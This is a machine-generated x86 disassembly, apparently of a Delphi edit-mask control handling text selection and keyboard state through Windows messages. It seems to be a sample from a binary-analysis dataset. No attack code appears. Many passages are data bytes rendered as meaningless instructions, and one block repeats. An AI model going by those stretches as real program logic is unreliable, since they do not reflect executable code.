add [ eax + 0x4f0b003e ] al
outsb
push ebx
je r-xdata
test [ eax + eax ] eax
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
jb r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
sub [ ecx + 0xd80044 ] al
mov [ ebx + ebx * 8 + 0x2e80f74 ] 0x1d
stc
jmp [ edi + ecx * 4 + 0x5 ]
jb r-xdata
mov eax ebx
call sub_471d98
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_4528b4
xor eax 0x8bfffe10
retn
inc esp
jb r-xdata
inc esp
outsd
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
mov ebx 0x23c
add [ ebp + 0xc ] dh
nop
push ebx
push esi
test dl dl
je r-xdata
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_472474
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_47270c
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_472228
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_4727dc
sub_471258
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3700ffff ] ah
cmp eax [ ebp ]
in al dx
cmp eax [ ebp ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
add eax 0x336c7443
inc esp
hlt
sub_4715d5
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070030 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9461618
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
inc esp
jb r-xdata
dec ebx
jns r-xdata
je r-xdata
push edi
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax + 0x4f090038 ] al
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jns r-xdata
jb r-xdata
add [ eax ] al
xor [ ebx ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + eax - 0x10 ] 0x0
add bh bh
[ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
loopne r-xdata
jo r-xdata
add [ eax + eax - 0x28 ] 0xd8ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003c ] al
fadd [ ecx + 0x1e00044 ]
add bh bh
loopne r-xdata
dec ebp
outsd
jne r-xdata
fadd [ eax ]
jb r-xdata
inc [ ecx ]
push edi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060037 ] al
outsb
inc ebp
js r-xdata
add [ eax + 0x4f070036 ] al
add [ eax ] al
dec edi
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
dec ebp
outsd
jne r-xdata
outsb
add [ eax + eax - 0x30 ] 0x0
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0039 ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or cl [ edi + 0x6e ]
outsb
dec edi
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add al [ eax ]
add [ ecx + rw-data ] ah
push ebp
jo r-xdata
arpl [ ebx - 0x4 ] bp
add [ eax + eax + 0x10 ] 0x1
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
inc esp
outsd
ja r-xdata
mov al [ eax ]
mov [ esi + 0x224 ] al
mov eax esi
test bl bl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4419f0
mov al [ r-xdata ]
mov [ esi + 0x22d ] al
mov eax [ rw-data ]
add esp 0xfffffff0
call sub_4034f4
dec edi
outsb
push ebx
je r-xdata
mov al 0x80
inc esp
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003a ] al
mov [ ecx + 0x1e80044 ] es
add bh bh
call 0x246173b
inc ebp
outsb
inc esp
xor al 0x0
or [ edi + 0x6e ] ecx
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
add [ eax + eax + 0x18 ] 0x1
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
add [ eax + eax - 0x28 ] 0xd8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
add [ eax + eax + 0x8 ] 0x1
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003e ] al
outsb
push ebx
je r-xdata
test [ eax + eax ] eax
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
jb r-xdata
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or ecx [ edi + 0x6e ]
sub [ ecx + 0xd80044 ] al
mov [ ebx + ebx * 8 + 0x2e80f74 ] 0x1d
stc
jmp [ edi + ecx * 4 + 0x5 ]
jb r-xdata
mov eax ebx
call sub_471d98
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_4528b4
xor eax 0x8bfffe10
retn
inc esp
jb r-xdata
inc esp
outsd
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
mov ebx 0x23c
add [ ebp + 0xc ] dh
nop
push ebx
push esi
test dl dl
je r-xdata
test [ esp ] 0x2
jne r-xdata
cmp [ esi ] 0x25
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_472474
test [ esp ] 0x1
jne r-xdata
cmp [ esi ] 0x27
jne r-xdata
test [ esp ] 0x4
jne r-xdata
cmp [ esi ] 0x26
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x28
jne r-xdata
cmp [ esi ] 0x24
je r-xdata
mov dx [ esi ]
mov cl [ esp ]
mov eax ebx
call sub_47270c
mov [ esi ] 0x0
jmp r-xdata
cmp [ esi ] 0x23
jne r-xdata
cmp [ esi ] 0x2e
jne r-xdata
cmp [ esi ] 0x8
jne r-xdata
test [ esp ] 0x1
je r-xdata
mov eax ebx
call sub_472228
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov [ esi ] 0x0
jmp r-xdata
mov dx [ esi ]
mov eax ebx
call sub_4727dc
sub_471940
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
cmp [ ebx + 0x23c ] 0x0
jne r-xdata
mov eax ebx
call sub_471d98
test al al
je r-xdata
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_45299c
pop edx
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
cmp [ esi ] 0x25
je r-xdata
test [ esp ] 0x4
je r-xdata
cmp [ esi ] 0x27
jne r-xdata
mov eax ebx
call sub_472228
sub_471990
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_452a6c
mov eax esi
call sub_471d98
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
mov al [ ebx ]
sub al 0x3
je r-xdata
sub al 0x13
je r-xdata
sub al 0x2
je r-xdata
mov edx ebx
mov eax esi
call sub_47229c
mov [ ebx ] 0x0
sub_4719e8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44eb24
mov eax ebx
call sub_471d98
test al al
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_471f70
mov eax [ esp ]
mov [ ebx + 0x230 ] eax
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov eax ebx
call sub_472228
movsx eax [ esi + 0x8 ]
cmp eax [ ebx + 0x234 ]
jle r-xdata
mov eax [ esp + 0x4 ]
mov [ ebx + 0x230 ] eax
sub_471a68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471ac4
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_471ad0
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40432c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471acb
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax esi
call sub_4043e0
mov edx eax
mov eax ebx
call sub_44d168
mov eax ebx
call sub_472228
sub_471ae4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471b68
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_471d98
test al al
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_471ad0
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax ebx
call sub_472ba8
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44d18c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471b6f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
lea eax [ ebp - 0x8 ]
push eax
mov edx [ esi ]
xor ecx ecx
mov eax ebx
call sub_472b60
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403f74
sub_471b78
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471c6e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_471d98
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_403fb8
cmp [ ebx + 0x22c ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44d1bc
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_472b60
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_403fb8
lea eax [ ebp - 0xc ]
push eax
mov cl [ ebx + 0x224 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x220 ]
call sub_470adc
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_403fb8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471c75
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f44
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471a68
test [ ebx + 0x1c ] 0x10
je r-xdata
test [ ebx + 0x22d ] 0x4
jne r-xdata
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
test al al
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_471c7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_471d98
test al al
jne r-xdata
mov eax ebx
call sub_441d84
mov dx 0x2e
mov eax ebx
call sub_4727dc
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_471cb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471d8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_471d98
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
cmp [ ebx + 0x20e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471d91
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f44
retn
call sub_4313e0
mov edx [ eax ]
call [ edx + 0x18 ]
call sub_4313e0
lea edx [ ebp - 0x4 ]
call sub_431028
call sub_4313e0
mov edx [ eax ]
call [ edx + 0x14 ]
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_471f70
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_471ad0
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
call sub_473294
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_471a68
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_47332c
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_471a68
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_471fb8
sub_471da8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471e5d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_471ad0
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_472ba8
lea eax [ ebx + 0x220 ]
mov edx esi
call sub_403f74
mov eax esi
call sub_4041e0
mov edx eax
mov eax [ ebx + 0x220 ]
call sub_47086c
mov [ ebx + 0x228 ] eax
mov eax esi
call sub_4706f0
mov [ ebx + 0x22c ] al
mov eax esi
call sub_470774
mov [ ebx + 0x224 ] al
lea eax [ ebp - 0xc ]
push eax
mov cl 0x1
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_472b60
mov edx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
call sub_403fb8
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471a68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471e64
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f44
retn
sub_471e6c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x220 ]
call sub_40432c
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_471da8
and [ ebx + 0x22d ] 0xfe
cmp [ ebx + 0x220 ] 0x0
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_471f70
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax ebx
call sub_441b18
mov eax ebx
call sub_471d98
test al al
je r-xdata
or [ ebx + 0x22d ] 0x1
xor edx edx
mov eax ebx
call sub_471a68
mov eax ebx
call sub_453d8c
test al al
je r-xdata
cmp [ ebx + 0x228 ] 0x0
jle r-xdata
mov eax ebx
call sub_453a88
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_441b18
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_471fb8
sub_471f40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_471d98
test al al
jne r-xdata
mov edx [ ebx + 0x228 ]
mov eax ebx
call sub_441b18
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_441b18
pop esi
pop ebx
retn
sub_471f70
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb0
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_471f94
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0xb1
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_471fb8
push ebp
mov ebp esp
add esp 0xfffffde4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x218 ] ecx
mov [ ebp - 0x214 ] ecx
mov [ ebp - 0x210 ] ecx
mov [ ebp - 0x20c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_472218
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_471d98
test al al
je r-xdata
lea edx [ ebp - 0x20c ]
mov eax [ ebp - 0x4 ]
call sub_471ad0
mov eax [ ebp - 0x20c ]
mov edx ebx
call sub_40c218
cmp al 0x1
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
cmp [ ebp - 0x8 ] 0x0
jge r-xdata
dec ebx
lea edx [ ebp - 0x218 ]
mov eax [ ebp - 0x4 ]
call sub_471ad0
mov eax [ ebp - 0x218 ]
call sub_4041e0
cmp eax [ ebp - 0x8 ]
jg r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
lea edx [ ebp - 0x210 ]
mov eax [ ebp - 0x4 ]
call sub_471ad0
mov eax [ ebp - 0x210 ]
call sub_4041e0
cmp ebx eax
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_471f94
lea edx [ ebp - 0x21c ]
mov eax [ ebp - 0x4 ]
call sub_471ad0
mov eax [ ebp - 0x21c ]
call sub_4041e0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
lea edx [ ebp - 0x214 ]
mov eax [ ebp - 0x4 ]
call sub_471ad0
mov eax [ ebp - 0x214 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov ecx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_471f94
cmp ebx [ ebp - 0x8 ]
je r-xdata
mov [ ebp - 0x8 ] eax
mov ebx [ ebp - 0x8 ]
inc ebx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x230 ] edx
jmp r-xdata
lea eax [ ebp - 0x108 ]
push eax
call GetKeyboardState
mov edx 0x100
lea eax [ ebp - 0x208 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47221f
lea eax [ ebp - 0x21c ]
mov edx 0x5
call sub_403f44
retn
mov [ eax ] 0x0
inc eax
dec edx
jne r-xdata
mov [ ebp - 0x1f8 ] 0x81
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40338c
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
mov [ ebp + eax - 0x208 ] 0x81
lea eax [ ebp - 0x208 ]
push eax
call SetKeyboardState
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x1
xor eax eax
push ebp
push sub_472186
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40338c
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x100
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SendMessageA
push 0x1
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40338c
and eax 0x7f
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x101
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] 0x0
retn
sub_472228
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_471d98
test al al
je r-xdata
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax ebx
call sub_471f70
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx [ esp ]
mov eax ebx
call sub_471fb8
sub_472274
push ebx
mov ebx eax
mov eax ebx
call sub_441b5c
test al al
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x238 ]
mov eax ebx
call sub_471a68
xor edx edx
mov eax ebx
call sub_441b94
sub_47229c
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_472461
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
xor eax eax
mov al [ ebx ]
cmp ax 0x1b
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe8 ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xec ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472468
lea eax [ ebp - 0x10 ]
call sub_403f20
retn
cmp [ esi + 0x20e ] 0x0
jne r-xdata
xor eax eax
mov al [ ebx ]
cmp ax 0x8
je r-xdata
cmp ax 0xd
jne r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_471f70
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xf8 ]
jmp r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov dx 0x2e
mov eax esi
call sub_4727dc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4726b0
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_471fb8
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_472d7c
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x1
push 0x102
push 0x102
mov eax esi
call sub_453a88
push eax
lea eax [ ebp - 0x2c ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebp - 0x28 ] 0x12
jne r-xdata
lea eax [ ebp - 0x10 ]
mov dl [ ebx ]
call sub_404108
lea eax [ ebp - 0x30 ]
mov dl [ ebx ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
call sub_402a88
lea eax [ ebp - 0x38 ]
mov dl [ ebp - 0x24 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x38 ]
lea eax [ ebp - 0x34 ]
mov cl 0x2
call sub_402a58
lea edx [ ebp - 0x34 ]
lea eax [ ebp - 0x10 ]
call sub_404184
mov ecx [ ebp - 0x8 ]
add ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_471f94
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
call PostQuitMessage
mov eax [ ebp - 0x10 ]
call sub_4043e0
push eax
push 0x0
push 0xc2
mov eax esi
call sub_453a88
push eax
call SendMessageA
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_471f70
xor ecx ecx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_47265c
sub_472474
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47264e
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp - 0x1 ] 0x4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472655
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f44
retn
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_471f70
test [ ebp - 0x1 ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
dec eax
jle r-xdata
cmp si 0x27
jne r-xdata
cmp si 0x25
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
dec [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
add eax 0x2
cmp eax [ ebp - 0xc ]
jne r-xdata
inc [ ebx + 0x230 ]
mov eax [ ebp - 0x8 ]
inc eax
cmp eax [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_472694
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebx + 0x230 ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_471ad0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
cmp [ ebx + 0x230 ] 0x0
jge r-xdata
mov eax [ ebx + 0x230 ]
cmp eax [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebx + 0x228 ]
cmp eax [ ebx + 0x230 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_471f94
inc [ ebx + 0x230 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_471ad0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov al [ eax + edx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_471fb8
jmp r-xdata
mov edx [ ebx + 0x230 ]
mov eax ebx
call sub_471fb8
jmp r-xdata
